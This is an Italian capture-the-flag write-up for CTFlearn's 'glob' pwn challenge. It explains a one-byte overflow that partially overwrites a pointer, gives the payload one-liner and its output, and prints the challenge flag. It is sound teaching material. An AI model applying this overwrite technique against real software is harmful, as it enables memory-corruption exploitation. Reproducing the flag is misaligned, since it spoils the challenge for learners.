# glob - PWN (Partial Pointer Overwrite)

**Flag:** `CTFlearn{p4rt14l_ptr_0v3rwr1t3}`

## Analisi
Struct packed: `char flag[32]; char username[32]; char *message;`. Il codice imposta `message = username`, poi fa `read(STDIN, username, 33)` --> legge **33 byte**: i primi 32 riempiono `username`, il 33esimo scrive sul **byte piu' basso** del puntatore `message`. Infine stampa `puts(message)`.

Indirizzi (binario non-PIE):
- `flag`     @ `0x404080` --> byte basso `0x80`
- `username` @ `0x4040a0` --> byte basso `0xa0`

Scrivendo `0x80` come 33esimo byte, `message` passa da puntare a `username` a puntare a `flag`.

## Soluzione - passo per passo
1. Entra nella cartella:
   ```
   cd glob
   ```
2. Invia 32 byte di riempimento + il byte `0x80`:
   ```
   python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'\x80')" | ./task
   ```
   Output --> `Your name? CTFlearn{p4rt14l_ptr_0v3rwr1t3}`

> Nota: il byte basso di `flag` (`0x80`) e' fisso anche con ASLR, perche' sono gli ultimi bit dell'indirizzo che non cambiano.
